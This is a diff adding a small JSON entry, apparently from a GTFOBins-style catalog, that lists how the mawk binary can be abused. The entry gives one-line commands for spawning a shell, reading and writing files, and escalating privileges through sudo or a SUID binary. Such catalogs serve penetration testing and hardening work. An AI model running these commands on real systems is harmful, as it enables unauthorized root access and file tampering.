@@ -1,0 +1,29 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "mawk 'BEGIN {system(\"/bin/sh\")}'"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "mawk 'BEGIN { print \"DATA\" > \"[file]\" }'\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "mawk '//' \"[file]\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./mawk 'BEGIN {system(\"/bin/sh\")}'"
+      }
+    ]
+  }
+}
